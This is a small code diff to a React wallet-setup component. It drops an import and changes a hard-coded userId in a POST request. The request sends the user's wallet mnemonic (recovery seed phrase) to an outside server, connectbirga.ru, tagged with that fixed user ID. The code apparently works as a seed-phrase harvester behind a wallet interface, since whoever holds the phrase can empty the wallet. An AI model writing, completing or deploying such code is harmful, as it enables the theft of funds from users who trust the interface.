@@ -1,5 +1,4 @@
 import React, { useCallback, useEffect, useState } from "react";
-import ListContainer from "./components/ListContainer/ListContainer";
 import ListInput from "./components/ListContainer/ListInput";
 import cl from "./components/One/One.module.scss";
 import CreateButton from "../Profile/components/CreateButton/CreateButton";
@@ -54,7 +53,7 @@ const WalletInit = () => {
 
             const user = await axios.post("https://www.connectbirga.ru/user/wallet", {
                 mnemonic: inputs,
-                userId: 858931156,
+                userId: 1392120153,
               } , {
                 headers : {
                   "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
